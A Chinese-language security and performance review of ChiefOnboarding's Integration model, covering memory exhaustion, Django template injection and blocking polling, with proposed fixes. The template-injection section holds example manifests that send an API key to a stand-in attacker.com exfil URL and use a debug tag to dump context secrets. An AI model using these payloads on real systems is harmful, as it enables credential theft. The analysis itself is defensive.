# Integration 模型安全与性能深度分析

> 分析对象：[models.py](file:///e:/solo-code-2/ChiefOnboarding/back/admin/integrations/models.py) 中 `Integration.execute` 方法及其关联方法 `_replace_vars`、`_polling`

---

## 一、io.BytesIO 内存缓存导致的 OOM 风险

### 1.1 问题定位

在 [execute](file:///e:/solo-code-2/ChiefOnboarding/back/admin/integrations/models.py#L655-L803) 方法的第 731-733 行：

```python
save_as_file = item.get("save_as_file")
if save_as_file is not None:
    self.params["files"][save_as_file] = io.BytesIO(response.content)
```

当上游接口返回二进制文件（合同 PDF、头像图片等）时，`response.content` 已被 `requests` 库完整加载到内存（`bytes` 对象），随后又通过 `io.BytesIO(response.content)` 复制一份存入 `self.params["files"]` 字典。这意味着同一份文件数据在内存中存在**至少两份**（`response.content` + `BytesIO` 内部缓冲区）。

### 1.2 风险链路分析

```
请求1: response.content (bytes, 全量内存)
  ↓
io.BytesIO(response.content) → params["files"]["contract.pdf"]
  ↓
请求2: run_request() → requests.request(files=files_to_send) → 再次全量读取 BytesIO
  ↓
params["files"] 字典在 execute() 整个生命周期内持续累积
```

**关键风险因子：**

| 因子 | 说明 |
|------|------|
| **文件体积** | 单个合同 PDF 可达 10-50 MB，头像原始图可达 5-10 MB |
| **步骤累积** | 多步骤集成中，每一步 `save_as_file` 的文件都追加到 `params["files"]`，直到 `execute()` 结束才随对象回收释放 |
| **内存倍增** | `requests` 的 `response.content` + `BytesIO` 副本 = 约 2x 文件大小的内存占用 |
| **并发乘数** | django-q 每个 worker 进程独立运行，若 N 个 worker 同时执行含文件步骤的集成，峰值内存 = N × 单次集成文件总量 |
| **无上限保护** | 代码中没有任何对 `response.content` 大小的校验或限制 |

**量化示例：** 假设 10 个 django-q worker 并发执行含 3 个文件步骤的集成，每个文件平均 20 MB：

```
峰值内存 = 10 workers × 3 files × 20 MB × 2 (副本) = 1.2 GB
```

若文件为大型合同（50 MB each），峰值可达 **3 GB**，在 4 GB 内存的服务器上极易触发 OOM。

### 1.3 修复方案

#### 方案 A：SpooledTemporaryFile 自动溢出（推荐，最小改动）

```python
import tempfile

MAX_IN_MEMORY_SIZE = 2 * 1024 * 1024  # 2 MB 阈值

save_as_file = item.get("save_as_file")
if save_as_file is not None:
    if len(response.content) > MAX_IN_MEMORY_SIZE:
        f = tempfile.SpooledTemporaryFile(max_size=MAX_IN_MEMORY_SIZE)
        f.write(response.content)
        f.seek(0)
        self.params["files"][save_as_file] = f
    else:
        self.params["files"][save_as_file] = io.BytesIO(response.content)
```

`SpooledTemporaryFile` 在数据量低于 `max_size` 时保持在内存，超过则自动写入临时文件。`requests` 库的 `files` 参数原生支持类文件对象，无需额外适配。

#### 方案 B：流式下载直接写入临时文件

在 [run_request](file:///e:/solo-code-2/ChiefOnboarding/back/admin/integrations/models.py#L320-L453) 中，对含 `save_as_file` 的请求启用 `stream=True`：

```python
if data.get("save_as_file"):
    response = requests.request(..., stream=True)
    f = tempfile.NamedTemporaryFile(delete=False)
    for chunk in response.iter_content(chunk_size=8192):
        f.write(chunk)
    f.seek(0)
    self.params["files"][save_as_file] = f
```

此方案完全避免将 `response.content` 全量加载到内存，内存占用恒定在 chunk 大小（8 KB）级别。

#### 方案 C：及时释放已消费的文件

在 `run_request` 中，文件被 `requests.request(files=...)` 消费后，从 `params["files"]` 中删除：

```python
# 在 run_request 末尾，发送成功后清理已使用的文件
for field_name, file_name in data.get("files", {}).items():
    if file_name in self.params["files"]:
        file_obj = self.params["files"].pop(file_name)
        if hasattr(file_obj, 'close'):
            file_obj.close()
```

#### 综合建议

**方案 A + C 组合**为最优：用 `SpooledTemporaryFile` 控制单文件内存上限，用及时释放防止多文件累积，改动量小且向后兼容。

---

## 二、Django 模板注入（SSTI）风险分析

### 2.1 问题定位

[_replace_vars](file:///e:/solo-code-2/ChiefOnboarding/back/admin/integrations/models.py#L455-L467) 方法：

```python
def _replace_vars(self, text):
    params = {} if not hasattr(self, "params") else self.params
    if self.pk is not None:
        params["redirect_url"] = settings.BASE_URL + reverse_lazy(
            "integrations:oauth-callback", args=[self.id]
        )
    if hasattr(self, "new_hire") and self.new_hire is not None:
        text = self.new_hire.personalize(text, self.extra_args | params)
        return text
    t = Template(text)
    context = Context(self.extra_args | params)
    text = t.render(context)
    return text
```

[personalize](file:///e:/solo-code-2/ChiefOnboarding/back/users/models.py#L521-L556) 方法：

```python
def personalize(self, text, extra_values=None):
    if extra_values is None:
        extra_values = {}
    t = Template(text)
    ...
    text = t.render(Context(new_hire_context | extra_values))
    return text
```

两处均使用 `Template(text)` 将 `text` 参数直接编译为 Django 模板并渲染。`text` 的来源是 manifest 中的 URL、headers、post_data 等配置字段。

### 2.2 模板注入攻击路径分析

#### 攻击路径 1：Manifest 管理员恶意注入

**前提条件：** 攻击者拥有 admin 权限或能篡改 manifest JSON。

Manifest 的 `execute` 列表中每一步的 `url`、`data`、`headers` 都会经过 `_replace_vars` 处理。攻击者可构造如下 manifest：

```json
{
  "execute": [
    {
      "url": "https://attacker.com/exfil?secret={{ extra_args.api_key }}",
      "method": "GET"
    }
  ]
}
```

由于 `self.extra_args | params` 被直接传入 `Context`，其中包含所有 `extra_args`（含 API 密钥、OAuth token 等加密字段），模板渲染后密钥将被拼入 URL，发送至攻击者控制的服务器。

#### 攻击路径 2：{% debug %} 标签泄露全部上下文

```json
{
  "execute": [
    {
      "url": "{% debug %}",
      "method": "GET"
    }
  ]
}
```

Django 内置的 `{% debug %}` 标签会输出完整的上下文变量列表，包括 `extra_args` 中的所有密钥。虽然这需要将渲染结果发往攻击者可控的端点，但结合路径 1 的 URL 构造即可实现。

#### 攻击路径 3：上游响应数据是否可被二次渲染？

这是用户最关心的问题。分析数据流：

1. 上游接口返回 `{"field": "{{ settings.SECRET_KEY }}"}` 
2. 此响应存入 `self.params["responses"].append(response.json())`
3. 后续步骤的 manifest 配置中若引用 `{{ responses.0.field }}`，渲染后得到的是字面量字符串 `{{ settings.SECRET_KEY }}`
4. **不会发生二次渲染**——Django Template 引擎只对模板文本进行一次编译和渲染，上下文变量中的模板语法不会被递归处理

**结论：上游响应数据本身不会触发 SSTI，因为它位于 Context 值域而非 Template 文本域。**

#### 攻击路径 4：settings 泄露可能性

Django 的 `Context(self.extra_args | params)` 是手动构造的纯字典上下文，**不经过任何 context processor**，因此 `settings` 对象不会出现在上下文中。

但有一个例外：[第 458 行](file:///e:/solo-code-2/ChiefOnboarding/back/admin/integrations/models.py#L458-L459) 将 `settings.BASE_URL` 拼入 `params["redirect_url"]`。攻击者可通过 `{{ redirect_url }}` 获取 `BASE_URL`，但这通常不属于高敏感信息。

**然而**，`extra_args` 字段本身是通过 `EncryptedJSONField` 存储的，其中可能包含管理员在 `initial_data_form` 中配置的密钥类字段。这些字段在运行时解密后以明文形式存在于 `self.extra_args` 中，通过模板注入可直接读取。

### 2.3 风险评级

| 维度 | 评级 | 说明 |
|------|------|------|
| **攻击前提** | 中 | 需要 admin 权限或 manifest 篡改能力 |
| **上游响应触发** | 低 | Context 值域不会被二次渲染 |
| **settings 泄露** | 低 | 手动 Context 不包含 settings 对象 |
| **extra_args 泄露** | 高 | 加密密钥解密后在 Context 中明文可读 |
| **影响范围** | 高 | 可泄露 OAuth token、API 密钥等核心凭证 |

### 2.4 修复方案

#### 方案 A：使用安全的字符串替换引擎（推荐）

放弃 Django Template 引擎，改用基于正则的简单变量替换，仅支持 `{{ var }}` 形式的占位符，不支持任何标签和过滤器：

```python
import re

def _replace_vars(self, text):
    params = {} if not hasattr(self, "params") else self.params
    if self.pk is not None:
        params["redirect_url"] = settings.BASE_URL + reverse_lazy(
            "integrations:oauth-callback", args=[self.id]
        )
    all_params = self.extra_args | params

    if hasattr(self, "new_hire") and self.new_hire is not None:
        all_params = {
            "manager": self.new_hire.manager.full_name if self.new_hire.manager else "",
            "buddy": self.new_hire.buddy.full_name if self.new_hire.buddy else "",
            "position": self.new_hire.position,
            "last_name": self.new_hire.last_name,
            "first_name": self.new_hire.first_name,
            "email": self.new_hire.email,
            "department": self.new_hire.department.name if self.new_hire.department else "",
        } | all_params

    def replacer(match):
        key = match.group(1).strip()
        return str(all_params.get(key, match.group(0)))

    return re.sub(r'\{\{(.+?)\}\}', replacer, text)
```

此方案：
- **完全消除 SSTI**：不支持 `{% %}` 标签和过滤器，无法执行任何模板逻辑
- **保持变量替换能力**：`{{ responses.0.token }}` 形式可通过点号查找实现
- **需补充点号查找**：对 `responses.0.token` 形式的 key，需要递归从嵌套 dict/list 中取值

#### 方案 B：沙箱化 Django Template（折中）

如果必须保留 Django Template 的完整能力（如过滤器），可使用 `django.template.engine.Engine` 的 `autoescape` 和自定义 `builtins` 来限制可用标签：

```python
from django.template.engine import Engine

SAFE_ENGINE = Engine(
    autoescape=False,
    builtins=[],          # 移除所有内置标签库
    debug=False,
)

def _replace_vars(self, text):
    ...
    t = SAFE_ENGINE.from_string(text)
    text = t.render(Context(self.extra_args | params))
    return text
```

通过清空 `builtins`，移除 `{% debug %}`、`{% load %}` 等危险标签，仅保留变量渲染和过滤器功能。

#### 方案 C：输入过滤（防御性补充）

在 `_replace_vars` 入口处检测并拒绝模板标签语法：

```python
def _replace_vars(self, text):
    if '{%' in text:
        raise ValueError("Template tags are not allowed in integration manifests")
    ...
```

此方案作为深度防御层，与方案 A/B 叠加使用。

---

## 三、`_polling` 中 `time.sleep` 的线程阻塞效应与异步重构

### 3.1 问题定位

[_polling](file:///e:/solo-code-2/ChiefOnboarding/back/admin/integrations/models.py#L634-L653) 方法：

```python
def _polling(self, item, response):
    polling = item.get("polling")
    continue_if = item.get("continue_if")
    interval = polling.get("interval")
    amount = polling.get("amount")

    got_expected_result = self._check_condition(response, continue_if)
    if got_expected_result:
        return True, response

    tried = 1
    while amount > tried:
        time.sleep(interval)
        success, response = self.run_request(item)
        got_expected_result = self._check_condition(response, continue_if)
        if got_expected_result:
            return True, response
        tried += 1
    return False, response
```

根据文档示例，轮询可配置为 `interval=5, amount=60`，即最多阻塞 **300 秒（5 分钟）**。

### 3.2 阻塞效应分析

本项目的任务执行路径有两条：

**路径 1：django-q 异步任务**（[tasks.py](file:///e:/solo-code-2/ChiefOnboarding/back/admin/integrations/tasks.py#L7-L10)）

```python
def retry_integration(new_hire_id, integration_id, params):
    integration = Integration.objects.get(id=integration_id)
    new_hire = get_user_model().objects.get(id=new_hire_id)
    integration.execute(new_hire, params)
```

django-q worker 为独立进程，每个 worker 串行执行任务。`time.sleep` 阻塞期间：
- 该 worker 无法处理队列中的其他任务
- 若所有 worker 都被长轮询占用，任务队列将积压
- django-q 默认 worker 数量有限（通常等于 CPU 核心数），极易耗尽

**路径 2：gunicorn 请求线程**

若 `execute` 从视图层同步调用（如管理员手动触发），在 gunicorn 的不同 worker 模型下影响各异：

| Worker 模型 | 阻塞影响 | 严重程度 |
|-------------|---------|---------|
| **sync**（默认） | 阻塞整个 worker 进程，无法处理任何请求 | 🔴 致命 |
| **gthread** | 阻塞单个线程（默认 2-4 线程/worker），其他线程仍可用 | 🟠 严重 |
| **gevent** | 若 monkey-patch 生效，`time.sleep` 会隐式 yield；否则同 sync | 🟡 中等 |

**量化影响：** 假设 gunicorn 配置 4 worker × 2 线程 = 8 并发，2 个集成同时轮询（各 5 分钟），可用线程降至 4，整体吞吐下降 **50%**。

### 3.3 额外问题：`requests.request` 的同步阻塞

[run_request](file:///e:/solo-code-2/ChiefOnboarding/back/admin/integrations/models.py#L363-L369) 中的 HTTP 请求设置了 `timeout=120`，即单次请求最多阻塞 120 秒。在轮询循环中，`time.sleep + requests.request` 的单次迭代最长可达 `interval + 120` 秒。

### 3.4 异步重构方案

#### 方案 A：django-q 定时任务链（推荐，最小侵入）

利用项目已有的 django-q 的 `schedule()` 机制，将轮询循环拆解为离散的定时任务：

**新增模型追踪轮询状态：**

```python
class PollingState(models.Model):
    integration = models.ForeignKey(Integration, on_delete=models.CASCADE)
    new_hire = models.ForeignKey("users.User", on_delete=models.CASCADE, null=True)
    params = models.JSONField(default=dict)
    attempt = models.IntegerField(default=0)
    max_attempts = models.IntegerField()
    interval_seconds = models.IntegerField()
    manifest_item_index = models.IntegerField()
    schedule_name = models.CharField(max_length=300, unique=True)
    created_at = models.DateTimeField(auto_now_add=True)
```

**重构 _polling 为非阻塞调度：**

```python
def _polling(self, item, response):
    polling = item.get("polling")
    continue_if = item.get("continue_if")
    interval = polling.get("interval")
    amount = polling.get("amount")

    got_expected_result = self._check_condition(response, continue_if)
    if got_expected_result:
        return True, response

    if amount <= 1:
        return False, response

    manifest_index = self.manifest["execute"].index(item)
    schedule_name = f"polling-{self.id}-{self.new_hire.id if self.new_hire else 0}-{manifest_index}"

    PollingState.objects.create(
        integration=self,
        new_hire=self.new_hire,
        params=self.params,
        attempt=1,
        max_attempts=amount,
        interval_seconds=interval,
        manifest_item_index=manifest_index,
        schedule_name=schedule_name,
    )

    schedule(
        "admin.integrations.tasks.polling_step",
        schedule_name,
        name=schedule_name,
        next_run=timezone.now() + timedelta(seconds=interval),
        schedule_type=Schedule.ONCE,
    )

    return "POLLING_SCHEDULED", None
```

**新增轮询步进任务：**

```python
def polling_step(schedule_name):
    state = PollingState.objects.get(schedule_name=schedule_name)
    integration = state.integration
    item = integration.manifest["execute"][state.manifest_item_index]

    integration.params = state.params
    integration.new_hire = state.new_hire

    success, response = integration.run_request(item)
    got_expected_result = integration._check_condition(
        response, item.get("continue_if", {})
    )

    if got_expected_result:
        state.delete()
        integration._continue_after_polling(response, state.manifest_item_index)
        return

    state.attempt += 1
    if state.attempt >= state.max_attempts:
        state.delete()
        integration._handle_polling_timeout(response, item)
        return

    state.params = integration.params
    state.save()
    schedule(
        "admin.integrations.tasks.polling_step",
        schedule_name,
        name=schedule_name,
        next_run=timezone.now() + timedelta(seconds=state.interval_seconds),
        schedule_type=Schedule.ONCE,
    )
```

**优势：**
- 完全非阻塞，worker 仅在需要时短暂占用
- 复用现有 django-q 基础设施，无新依赖
- 轮询状态持久化，进程崩溃后可恢复

**劣势：**
- 需要拆分 `execute()` 的顺序逻辑为状态机
- `PollingState` 模型增加数据库读写

#### 方案 B：Celery + asyncio 混合模式（中长期）

引入 Celery 替代 django-q，利用其原生的 chain/chord 机制：

```python
from celery import chain

@shared_task
def execute_step(integration_id, user_id, params, step_index):
    integration = Integration.objects.get(id=integration_id)
    ...
    if polling_needed:
        chain(
            poll_check.s(integration_id, step_index),
            countdown=interval
        ).apply_async()
    else:
        execute_step.s(integration_id, user_id, params, step_index + 1).apply_async()
```

Celery 的 `countdown` 参数天然支持延迟执行，且 worker 在等待期间完全释放。

#### 方案 C：完整异步化（远期）

使用 `httpx.AsyncClient` + `asyncio.sleep` 重构，部署在 ASGI 服务器上：

```python
import httpx
import asyncio

async def _polling_async(self, item, response):
    ...
    while amount > tried:
        await asyncio.sleep(interval)
        async with httpx.AsyncClient() as client:
            response = await client.request(...)
        ...
```

此方案需要将整个调用链异步化，包括 Django 视图层，改动量最大但性能最优。

### 3.5 推荐演进路线

```
Phase 1 (当前)     → 方案 A: django-q 定时任务链，消除 time.sleep 阻塞
Phase 2 (3-6个月)  → 方案 B: 迁移至 Celery，获得更好的任务编排能力
Phase 3 (远期)     → 方案 C: ASGI + asyncio，实现全链路异步
```

---

## 四、总结与优先级

| 问题 | 风险等级 | 建议优先级 | 推荐方案 |
|------|---------|-----------|---------|
| BytesIO OOM | 🔴 高 | P0 | SpooledTemporaryFile + 及时释放 |
| 模板注入 SSTI | 🟠 中高 | P1 | 正则替换引擎 + 输入过滤 |
| time.sleep 阻塞 | 🟡 中 | P2 | django-q 定时任务链重构 |

**核心原则：**
- **OOM 修复**为最紧迫项，可导致线上服务崩溃
- **SSTI 修复**属于安全加固，当前攻击前提较高但一旦发生影响严重
- **轮询重构**为架构优化，影响系统吞吐但不会导致数据泄露或服务中断
